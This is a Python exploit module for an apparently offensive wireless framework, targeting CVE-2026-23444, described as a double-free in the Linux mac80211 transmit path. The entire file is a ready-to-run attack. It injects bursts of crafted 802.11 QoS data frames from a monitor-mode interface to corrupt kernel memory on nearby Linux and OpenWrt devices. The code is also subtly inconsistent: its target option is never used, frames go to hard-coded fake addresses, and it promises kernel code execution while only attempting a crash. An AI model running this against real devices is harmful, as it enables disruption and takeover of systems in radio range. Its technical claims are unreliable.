# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Linux mac80211 SKB Double-Free in TX Preparation (CVE-2026-23444).

    The mac80211 wireless stack in the Linux kernel contains a
    double-free vulnerability in the SKB transmit preparation path.
    When a station sends data frames through an interface where
    certain TX offload features are active, the kernel may free the
    same socket buffer (SKB) twice under specific timing conditions.
    This race condition in the TX preparation code path can be
    triggered by injecting a rapid burst of specially crafted 802.11
    data frames that exercise the problematic code path.

    The double-free corrupts the SLUB allocator metadata, which can
    be leveraged for kernel heap exploitation, ultimately leading to
    arbitrary code execution at ring 0.

    CVSS v3.1: estimated 8.0+ (Critical), AV:A/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Linux mac80211 SKB Double-Free in TX Preparation (CVE-2026-23444)",
        "description": (
            "Exploits CVE-2026-23444, a double-free vulnerability in the "
            "mac80211 SKB transmit preparation path.  Under specific timing "
            "conditions, the kernel frees the same socket buffer twice during "
            "TX preparation.  An attacker within WiFi range can inject a "
            "rapid burst of crafted 802.11 data frames to trigger the race "
            "condition, corrupting SLUB allocator metadata and achieving "
            "kernel-level code execution."
        ),
        "authors": (
            "mrhenrike (Andre Henrique)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-23444",
            "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git",
        ),
        "disclosure_date": "2026-02-10",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Linux kernels with mac80211 TX offload (5.15+)",
            "Ubuntu 22.04/24.04 (unpatched)",
            "OpenWrt 23.x (unpatched)",
        ),
    }

    exploit_attributes = {
        "cve": "CVE-2026-23444",
        "cvss": 8.0,
        "type": "double-free",
        "impact": "rce",
        "vector": "adjacent-network",
        "component": "mac80211",
        "platform": "linux",
    }

    target = OptIP("", "Target station MAC or BSSID (monitor mode required)")
    port = OptPort(1, "Unused (WiFi frame injection does not use ports)")
    timeout = OptFloat(5.0, "Timeout for frame injection and response capture")
    interface = OptString("wlan0mon", "Monitor-mode wireless interface for injection")
    burst_size = OptInteger(128, "Number of frames per burst to trigger race condition")
    burst_rounds = OptInteger(16, "Number of burst rounds")
    inter_frame_delay = OptFloat(0.0001, "Delay in seconds between frames within a burst")

    # 802.11 frame type/subtype constants
    _FRAME_TYPE_DATA = 0x02
    _SUBTYPE_DATA = 0x00
    _SUBTYPE_QOS_DATA = 0x08
    _SUBTYPE_NULL = 0x04
    _FRAME_TYPE_MGMT = 0x00
    _SUBTYPE_PROBE_REQ = 0x04

    # Frame flags
    _FROM_DS = 0x02
    _TO_DS = 0x01

    _BROADCAST = b"\xff\xff\xff\xff\xff\xff"
    _FAKE_BSSID = b"\x02\x00\x00\x00\x00\x01"
    _FAKE_SRC = b"\x02\x00\x00\x00\x00\x02"
    _FAKE_DST = b"\x02\x00\x00\x00\x00\x03"

    def _build_radiotap_header(self) -> bytes:
        """Minimal radiotap header for frame injection."""
        return struct.pack("<BBHI", 0, 0, 8, 0)

    def _build_frame_control(self, frame_type: int, subtype: int, flags: int = 0) -> bytes:
        fc_low = (frame_type & 0x03) | ((subtype & 0x0F) << 4)
        fc_high = flags & 0xFF
        return struct.pack("<BB", fc_low, fc_high)

    def _build_qos_data_frame(self, seq_num: int, tid: int = 0) -> bytes:
        """Build a QoS data frame designed to exercise the TX prep path.

        The double-free triggers when the TX preparation code path
        processes QoS data frames with specific sequence numbers and
        TID values that cause the SKB to be queued and then
        erroneously freed by a concurrent cleanup path.
        """
        fc = self._build_frame_control(
            self._FRAME_TYPE_DATA, self._SUBTYPE_QOS_DATA, self._TO_DS
        )
        duration = struct.pack("<H", 0)
        dst = self._FAKE_DST
        src = self._FAKE_SRC
        bssid = self._FAKE_BSSID
        seq_ctrl = struct.pack("<H", (seq_num & 0x0FFF) << 4)
        qos_ctrl = struct.pack("<H", tid & 0x0F)

        header = fc + duration + dst + bssid + src + seq_ctrl + qos_ctrl

        # Payload with pattern that exercises the fragmentation path
        # where the double-free occurs
        frag_marker = struct.pack("<HH", 0xDEAD, seq_num & 0xFFFF)
        padding = b"\x42" * 64
        payload = frag_marker + padding

        radiotap = self._build_radiotap_header()
        return radiotap + header + payload

    def _build_null_frame(self) -> bytes:
        """Build a null data frame to flush TX queues.

        The null frame forces the driver to process pending TX
        buffers, increasing the chance of hitting the race window
        between SKB free and reuse.
        """
        fc = self._build_frame_control(
            self._FRAME_TYPE_DATA, self._SUBTYPE_NULL, self._TO_DS
        )
        duration = struct.pack("<H", 0)
        dst = self._FAKE_DST
        bssid = self._FAKE_BSSID
        src = self._FAKE_SRC
        seq_ctrl = struct.pack("<H", 0)

        header = fc + duration + dst + bssid + src + seq_ctrl

        radiotap = self._build_radiotap_header()
        return radiotap + header

    def _build_probe_request(self) -> bytes:
        """Build a broadcast probe request for passive detection."""
        fc = self._build_frame_control(self._FRAME_TYPE_MGMT, self._SUBTYPE_PROBE_REQ)
        duration = struct.pack("<H", 0)
        dst = self._BROADCAST
        src = self._FAKE_SRC
        bssid = self._BROADCAST
        seq_ctrl = struct.pack("<H", 0)
        header = fc + duration + dst + src + bssid + seq_ctrl

        ssid_ie = struct.pack("BB", 0, 0)
        rates_ie = struct.pack("BB", 1, 4) + bytes([0x02, 0x04, 0x0B, 0x16])

        radiotap = self._build_radiotap_header()
        return radiotap + header + ssid_ie + rates_ie

    def _inject_frame(self, raw_sock: socket.socket, frame: bytes) -> bool:
        try:
            raw_sock.send(frame)
            return True
        except OSError:
            return False

    def _open_raw_wifi(self) -> socket.socket | None:
        """Open a raw socket on the monitor-mode interface."""
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((str(self.interface), 0))
            return sock
        except OSError:
            return None

    @mute
    def check(self) -> bool:
        """Verify we can inject frames on the monitor interface."""
        raw = self._open_raw_wifi()
        if raw is None:
            return False
        try:
            probe = self._build_probe_request()
            self._inject_frame(raw, probe)
            try:
                data = raw.recv(4096)
                return len(data) > 0
            except (OSError, TimeoutError):
                return True
        finally:
            raw.close()

    def run(self) -> None:
        if not self.interface:
            print_error("interface is required (e.g. wlan0mon)")
            return

        if not self.check():
            print_error(
                "Cannot open raw socket on the monitor interface. "
                "Ensure the interface is in monitor mode and you have root privileges."
            )
            return

        print_success("Monitor-mode socket established; injecting TX race trigger frames")
        self._exploit()

    def _exploit(self) -> None:
        raw = self._open_raw_wifi()
        if raw is None:
            print_error("Failed to open raw socket for injection")
            return

        print_status(
            f"Running {self.burst_rounds} burst rounds of "
            f"{self.burst_size} QoS data frames each "
            f"(inter-frame delay: {self.inter_frame_delay}s)"
        )

        total_injected = 0
        for rnd in range(self.burst_rounds):
            burst_ok = 0
            for i in range(self.burst_size):
                seq = (rnd * self.burst_size + i) & 0x0FFF
                tid = i % 8
                frame = self._build_qos_data_frame(seq, tid)
                if self._inject_frame(raw, frame):
                    burst_ok += 1
                if self.inter_frame_delay > 0:
                    time.sleep(self.inter_frame_delay)

            # Inject null frames between bursts to flush TX queues
            null_frame = self._build_null_frame()
            for _ in range(4):
                self._inject_frame(raw, null_frame)

            total_injected += burst_ok
            time.sleep(0.01)

        raw.close()

        expected = self.burst_rounds * self.burst_size
        print_status(f"Injected {total_injected}/{expected} QoS data frames")
        print_info(
            "If the target kernel is vulnerable, the rapid burst of "
            "QoS data frames interleaved with null frames should "
            "trigger the SKB double-free in the TX preparation path. "
            "Monitor the target for kernel oops, SLUB corruption "
            "warnings, or unexpected behavior."
        )
